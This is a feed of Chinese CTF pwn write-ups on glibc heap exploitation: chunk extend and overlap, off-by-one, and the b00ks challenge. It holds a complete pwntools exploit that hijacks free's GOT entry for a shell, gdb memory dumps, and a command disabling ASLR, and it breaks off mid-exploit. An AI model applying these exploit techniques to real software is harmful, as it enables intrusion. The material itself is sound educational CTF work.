class="line">-----------------------------------------</span><br><span class="line">chunk1 ========&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br><span class="line">chunk2 ========&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br></pre></td></tr></table></figure><p>可见如果我们数据的长度为0x18，调用edit_heap就可触发off-by-one覆盖下一堆块的prev_size</p><p>一个chunk在被free掉之后存在bins中，其头部含有prev_size和size，但一旦malloc后，这个prev_size就没用了，它只用来记录前一个空闲块的大小。因此如果malloc0x18个字节的话多出8个字节没有对齐，会将这个prev_size也当做data段的部分分配出去，而不是下一个堆了。</p><p>接下来就是利用<strong>通过 extend 后向 overlapping+fastbin</strong>实现利用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment"># chunk0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment"># chunk1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment"># chunk3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)<span class="comment"># 0x18,  off-by-one</span></span><br><span class="line">delete(<span class="number">1</span>)             <span class="comment"># 通过 extend 后向 overlapping</span></span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])<span class="comment">#这里的size涉及到后面修改地址时需要多长的字节</span></span><br><span class="line">create(<span class="number">0x70</span>,payload) <span class="comment">#重新创建chunk</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))  <span class="comment"># free_got地址</span></span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]  <span class="comment"># system地址</span></span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)) <span class="comment"># 写入</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)  <span class="comment"># free执行</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cn = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">lib = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(l,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    cn.sendline(str(int(l)))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    <span class="comment">#if index == 2:gdb.attach(cn)</span></span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap : '</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    gdb.attach(cn)</span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="comment">#leak free addr</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#3</span></span><br><span class="line">gdb.attach(cn)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)</span><br><span class="line">gdb.attach(cn)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)<span class="comment">#1</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"><span class="comment">#trim free_got</span></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/">https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Chunk-Extend-and-Overlapping&quot;&gt;&lt;a href=&quot;#堆溢出-Chunk-Extend-and-Overlapping&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Chunk Extend and Overlap
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-基本方法</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95/"/>
    <id>https://kabeor.github.io/堆溢出-基本方法/</id>
    <published>2020-01-03T12:08:16.574Z</published>
    <updated>2020-01-03T12:08:39.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-基本方法"><a href="#堆溢出-基本方法" class="headerlink" title="堆溢出-基本方法"></a>堆溢出-基本方法</h1><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p><p>堆溢出漏洞发生的基本前提是</p><ul><li>程序向堆上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h2 id="堆溢出的利用策略"><a href="#堆溢出的利用策略" class="headerlink" title="堆溢出的利用策略"></a>堆溢出的利用策略</h2><ol><li>覆盖与其<strong>物理相邻的下一个 chunk</strong>的内容。<ul><li>prev_size</li><li>size，主要有三个比特位，以及该堆块真正的大小。<ul><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the True chunk size</li></ul></li><li>chunk content，从而改变程序固有的执行流。</li></ul></li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li></ol><h2 id="重要步骤"><a href="#重要步骤" class="headerlink" title="重要步骤"></a>重要步骤</h2><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">//等同于</span><br><span class="line">ptr=malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure><p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p><ul><li>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时<ul><li>如果申请 size &gt; 原来 size<ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li></ul></li><li>如果申请 size &lt; 原来 size<ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li></ul></li></ul></li><li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li><li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li></ul><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>计算<strong>开始写入的地址与所要覆盖的地址之间的距离</strong>。 </p><p>一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行<code>malloc(0)</code>会返回用户区域为 16 字节的块。</p><p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size = 用户区域大小 + 2 * 字长</p><p>用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 prev_size 字段储存内容。</p><p><strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</strong></p><p>From <a href="https://kabeor.github.io/堆溢出-基本方法/">https://kabeor.github.io/堆溢出-基本方法/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-基本方法&quot;&gt;&lt;a href=&quot;#堆溢出-基本方法&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-基本方法&quot;&gt;&lt;/a&gt;堆溢出-基本方法&lt;/h1&gt;&lt;p&gt;堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（&lt;strong&gt;之所以是
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Off-By-One</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Off-By-One/"/>
    <id>https://kabeor.github.io/堆溢出-Off-By-One/</id>
    <published>2020-01-03T12:08:16.572Z</published>
    <updated>2020-01-03T12:08:39.150Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Off-By-One"><a href="#堆溢出-Off-By-One" class="headerlink" title="堆溢出-Off-By-One"></a>堆溢出-Off-By-One</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><p>类似如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char str[5]=&#123;0&#125;;</span><br><span class="line">str[5] = &apos;\0&apos;;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li></ol><h2 id="NULL-byte-off-by-one"><a href="#NULL-byte-off-by-one" class="headerlink" title="NULL byte off-by-one"></a>NULL byte off-by-one</h2><p> strlen 在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk</span><br></pre></td></tr></table></figure><p>在我们输入’A’*24 后执行 strcpy</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure><p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖。</p><p>为什么是低字节被覆盖呢：因为我们通常使用的 CPU 的字节序都是小端法的。</p><h2 id="例-Asis-CTF-2016-b00ks"><a href="#例-Asis-CTF-2016-b00ks" class="headerlink" title="例 Asis CTF 2016 b00ks"></a>例 Asis CTF 2016 b00ks</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>选单程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"\n1. Create a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2. Delete a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3. Edit a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4. Print book detail"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"5. Change current author name"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"6. Exit"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br></pre></td></tr></table></figure><p>创建book时，注意到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter author name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_9F5(off_202018, <span class="number">32</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fail to read author_name"</span>, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>author_name最大输入为32字符</p><p>sub_9F5为读取函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )        <span class="comment">////////////////////   i循环次数==了输入的次数</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;               <span class="comment">//////////// 注意在循环完又加了一个0，长度加1，可能发生NULL byte off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建book时如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = <span class="built_in">malloc</span>(<span class="number">32u</span>LL);</span><br><span class="line"> <span class="keyword">if</span> ( v3 )</span><br><span class="line"> &#123;</span><br><span class="line">   *(v3 + <span class="number">6</span>) = v1;      <span class="comment">/////////// book name size</span></span><br><span class="line">   *(off_202010 + v2) = v3;   <span class="comment">///// book name 固定为32</span></span><br><span class="line">   *(v3 + <span class="number">2</span>) = v5;      <span class="comment">/////////// book description</span></span><br><span class="line">   *(v3 + <span class="number">1</span>) = ptr;     <span class="comment">/////////// book_description_size</span></span><br><span class="line">   *v3 = ++unk_202024;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0L</span>L;c</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>当输入的author_name长度为32时，会向<code>book_name_ptr</code>中越界写入一个字节<code>\x00</code>。之后，在创建book_struct时，会将其地址保存在<code>global_book_struct_array</code>中，覆盖之前的字符串截断符<code>\x00</code>。因此，通过打印book_name可以实现信息泄露。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ .data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o  </span><br><span class="line">| .data:0000000000202010  ;book name ptr                         ; sub_BBD:loc_C1B↑o ...</span><br><span class="line">| .data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: sub_B6D+15↑o  </span><br><span class="line">| .data:0000000000202018  ;author_name ptr                       ; sub_D1F+CA↑o</span><br></pre></td></tr></table></figure><blockquote><p>临时禁用了系统的地址随机化功能：<code>echo 0 &gt; sudo tee /proc/sys/kernel/randomize_va_space</code></p></blockquote><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 填充满bookname</span><br><span class="line">2. 创建堆块1，覆盖bookname结尾的\x00,这样我们输出的时候就可以泄露堆块1的地址</span><br><span class="line">3. 创建堆块2，为后续做准备，堆块2要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</span><br><span class="line">4. 泄露堆块1地址，记为first_heap</span><br><span class="line">5. 利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块1的地址的最后一位，如果我们提前将堆块1的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</span><br><span class="line">6. 任意读取获得libc地址</span><br><span class="line">7. 任意写将__free_hook函数的地址改写成one_gadget地址</span><br><span class="line"></span><br><span class="line">tips:__free_hook若没有则不调用，若有将先于free函数调用</span><br></pre></td></tr></table></figure><p>gdb调试，r运行起来，另起终端</p><p><code>ps -ef |grep b00ks</code>  查看进程号为4056</p><p><code>cat /proc/进程号/maps</code>查看程序加载基址为0x555555554000</p><p>之后设置断点时 <strong>基址+ida地址 = 实际运行的地址</strong>。</p><p><img src="https://i.loli.net/2020/01/02/JIo8ebOl5jQPMVT.png" alt></p><p>发现下不去断点，内存无法访问，后来发现是下断点使用<code>bp</code>命令的原因，用<code>break</code>就好了</p><p>后来请教大师傅，得知gdb attch也可以</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">p=process(<span class="string">'./b00ks'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter author name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">32</span>)                 <span class="comment">############   author name输入32位字符触发堆溢出</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'\n1. Create a book'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功断下后</p><p>x/10xg 0x555555554000+0x202040查看堆</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>溢出的一个字符是0，所以看的不清楚，如果输入的是’a’*33，就很明显</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00000000000000610x0000000000000000  &lt;---- 61代替了0位置</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>使用create功能创建一个book后堆内变为如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161          author_name</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00005555557576f00x0000000000000000 &lt;------- book结构体地址管理数组</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000          用于放置每个book结构体的地址指针</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>再修改author_name，0x00005555557576f0最后两位就会被0覆盖成为0x0000555555757600.</p><p>再来看创建一个book，结构体记录的结构如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">book name size</span><br><span class="line">book name   （大小等于book name size）</span><br><span class="line">book description size</span><br><span class="line">book description （大小等于book description size）</span><br></pre></td></tr></table></figure><p>通过gdb调试发现</p><p>在堆中的指针指向如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555554000+0x202040                   </span><br><span class="line">0x555555756040:0x00000000000000610x0000000000000000</span><br><span class="line">0x555555756050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756060:0x00005555557577500x0000000000000000  图书结构体管理，用于按顺序存放多个book结构体指针</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000  第一个指针会被溢出覆盖</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x555555757750                           第一个book结构体内部结构</span><br><span class="line">0x555555757750:0x00000000000000010x00005555557576b0  book name size ?    book name</span><br><span class="line">0x555555757760:0x00005555557576d00x0000000000000078  book description    book description size</span><br><span class="line">0x555555757770:0x00000000000000000x00000000000207d1</span><br><span class="line">0x555555757780:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757790:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x5555557576d0</span><br><span class="line">0x5555557576d0:0x63636363636363630x6363636363636363  book description起始位置</span><br><span class="line">0x5555557576e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x5555557576f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x555555757700:0x63636363636363630x6363636363636363  555555757750覆盖后两位变成7700指向这里</span><br><span class="line">0x555555757710:0x63636363636363630x6363636363636363</span><br></pre></td></tr></table></figure><p>0x555555757700正好处于book description里，可以通过<code>3. Edit a book  4. Print book detail</code> 来进行写入和读取。</p><p>那么就可以通过book1来间接控制book2，原因是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">book结构指针指向图如下</span><br><span class="line">book ptr-|-&gt; name ptr        -|-&gt; name str</span><br><span class="line">         |-&gt; description ptr -|-&gt; description str</span><br><span class="line">         </span><br><span class="line">book1原来为        </span><br><span class="line">book1 ptr-|-&gt; name1 ptr        -|-&gt; name1 str</span><br><span class="line">          |-&gt; description1 ptr -|-&gt; description1 str</span><br><span class="line">          </span><br><span class="line">溢出后book1指向自己伪造的bookf，bookf我们构造为如下</span><br><span class="line">bookf ptr-|-&gt; name2 ptr        -|-&gt; name2 str</span><br><span class="line">          |-&gt; description2 ptr -|-&gt; description2 str</span><br><span class="line"></span><br><span class="line">这样，通过读写book1就可以间接读写book2指针了</span><br><span class="line">book1-book2</span><br><span class="line">          </span><br><span class="line">book1-|       |-book2</span><br><span class="line">      |-bookf-|    </span><br><span class="line">      可任意读写</span><br></pre></td></tr></table></figure><p>因为开启了Full RELRO因此无法利用赋写GOT表来实现劫持程序流，因此我们set，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。</p><p>在这里我们申请一个超大的块，来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之间存在固定的偏移因此可以推算出 libc 的基地址。</p><p><img src="https://i.loli.net/2020/01/03/WBMUV8rqKfZJsu5.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libcbase计算：</span><br><span class="line">libcbase = book2_name_ptr - offset</span><br><span class="line">offset = 0x00007ffff7da2010(book2_description_ptr) - 0x7ffff7de9000(libc基地址)</span><br><span class="line">在heap下面权限为r-xp的start部分的地址就是libc基地址</span><br></pre></td></tr></table></figure><p>fake book构造为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload =p64(1) + p64(book1_addr + 0x38) * 2 + p64(0xffff)</span><br><span class="line">                                偏移需要调试计算</span><br></pre></td></tr></table></figure><p>这个题目特殊之处在于开启 PIE 并且没有泄漏 libc 基地址的方法，因此利用__free_hook写入one_gadget，调用free执行即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">malloc_hook = libc.symbols[&apos;__free_hook&apos;] + libcbase</span><br><span class="line">execve_addr = libcbase + 